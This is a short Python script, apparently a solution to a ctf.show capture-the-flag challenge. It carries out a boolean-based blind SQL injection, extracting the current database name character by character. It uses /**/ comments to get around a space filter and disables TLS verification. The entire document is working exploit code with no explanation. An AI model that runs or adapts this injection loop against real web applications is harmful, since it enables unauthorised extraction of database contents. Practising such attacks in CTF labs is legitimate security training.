import requests
import warnings
warnings.filterwarnings("ignore")
word=""
num=0
url = "https://b14e78f6-4073-4fa1-ad67-8d5d1ed1deab.challenge.ctf.show/index.php?id=/**/or/**/"
for num1 in range(1,8):
    for num2 in range (65,123):
        data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
        result = requests.get(url + data,verify=False,timeout=2)
        if "If" in result.text:
            word+=chr(num2)
            print(word)
            break
        else:
            pass